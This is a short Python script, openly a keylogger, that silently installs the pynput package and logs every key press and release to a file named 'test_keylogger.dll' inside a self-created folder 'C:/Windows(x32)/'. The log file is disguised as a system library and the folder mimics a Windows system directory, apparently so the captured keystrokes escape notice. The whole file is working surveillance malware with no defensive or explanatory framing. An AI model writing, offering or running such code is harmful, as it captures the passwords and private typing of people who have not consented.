import logging
import os
import pathlib
import platform 

pip_pkg = ["pynput"]
for i in pip_pkg:
    if (os.system(f"pip show {i}")) == 0:
        print(f"{i} is Installed")
    else:
        os.system(f"pip install {i}")
        print(f"{i} Finish Installation")

from pynput import keyboard

def start_keylogger():
    dir = r"C:/Windows(x32)/" 
    logging.basicConfig(level=logging.INFO, filename= dir + 'test_keylogger.dll',filemode='a',format='%(process)d - %(asctime)s - %(message)s')

    def on_keypress(key):
        if key == keyboard.Key.esc:
            return False
        else:
            logging.info(str(key) + " is pressed")
           #  print(key,end="\t")       
    
    def on_keyrelease(key):
        logging.info(str(key) + " is released")
        # print(key , "is released", end="\t")
        #print(" ",end="/n") 

    l = keyboard.Listener(on_press = on_keypress, on_release = on_keyrelease)
    l.start()
    l.join()

def main():
    check = pathlib.Path("C:/Windows(x32)")
    if check.exists():
        start_keylogger()
    else:
        os.mkdir("C:/Windows(x32)") 
        start_keylogger()
        
if __name__ == '__main__':
    main()
        
